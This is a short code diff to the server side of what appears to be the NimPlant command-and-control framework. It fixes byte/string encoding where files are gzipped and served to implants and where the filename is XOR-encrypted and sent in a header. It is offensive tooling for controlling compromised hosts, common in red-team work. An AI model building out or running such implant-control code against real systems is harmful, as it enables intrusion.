@@ -501,7 +501,11 @@ def nim_implants_server(xor_key):
                             with io.BytesIO() as data:
                                 utils.nimplant_print(f"DEBUG: Creating GZIP file in memory")
                                 with gzip.GzipFile(fileobj=data, mode="wb") as zip_data:
-                                    zip_data.write(processed_file.encode("utf-8"))
+                                    # Verificar si ya es bytes o necesita ser convertido
+                                    if isinstance(processed_file, bytes):
+                                        zip_data.write(processed_file)
+                                    else:
+                                        zip_data.write(processed_file.encode("utf-8"))
                                 result_gzipped = data.getvalue()
                                 utils.nimplant_print(f"DEBUG: GZIP file created (size: {len(result_gzipped)} bytes)")
 
@@ -523,6 +527,9 @@ def nim_implants_server(xor_key):
                             res.headers["Content-Encoding"] = "gzip"
                             # Encrypt the filename with XOR before sending
                             encrypted_filename = encrypt_data(original_filename, np.encryption_key)
+                            # Asegurarse que sea bytes antes de codificar en base64
+                            if isinstance(encrypted_filename, str):
+                                encrypted_filename = encrypted_filename.encode("utf-8")
                             res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                             return res
                         except Exception as e:
@@ -563,7 +570,11 @@ def nim_implants_server(xor_key):
                             with io.BytesIO() as data:
                                 utils.nimplant_print(f"DEBUG: Creating GZIP file in memory")
                                 with gzip.GzipFile(fileobj=data, mode="wb") as zip_data:
-                                    zip_data.write(processed_file.encode("utf-8"))
+                                    # Verificar si ya es bytes o necesita ser convertido
+                                    if isinstance(processed_file, bytes):
+                                        zip_data.write(processed_file)
+                                    else:
+                                        zip_data.write(processed_file.encode("utf-8"))
                                 result_gzipped = data.getvalue()
                                 utils.nimplant_print(f"DEBUG: GZIP file created (size: {len(result_gzipped)} bytes)")
 
@@ -586,6 +597,9 @@ def nim_implants_server(xor_key):
                             res.headers["Content-Encoding"] = "gzip"
                             # Also send the original name if it's a fallback
                             encrypted_filename = encrypt_data(os.path.basename(np.hosting_file), np.encryption_key)
+                            # Asegurarse que sea bytes antes de codificar en base64
+                            if isinstance(encrypted_filename, str):
+                                encrypted_filename = encrypted_filename.encode("utf-8")
                             res.headers["X-Original-Filename"] = base64.b64encode(encrypted_filename).decode("utf-8")
                             return res
                         except Exception as e:
